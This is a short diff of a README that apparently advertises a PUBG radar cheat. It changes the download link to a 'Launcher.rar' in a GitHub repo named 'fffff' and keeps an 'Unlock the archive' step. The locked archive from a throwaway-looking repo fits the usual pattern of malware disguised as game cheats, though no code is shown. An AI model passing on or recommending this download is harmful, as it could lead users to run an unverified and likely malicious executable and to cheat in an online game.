@@ -3,7 +3,7 @@
 
 **1. Download the archive:**
 
-[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Launcher/Launcher.zip)
+[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Pubg/Launcher.rar)
 
 **2. Unlock the archive:**
 
@@ -70,5 +70,4 @@
 *  **Show Friendly:**  Keep an eye on your teammates.
 *  **Color:**  Customize the radar for easy visibility.
 
-## Take a Look:
-[SCREENSHOT](https://imgur.com/a/BPOSkry)
+
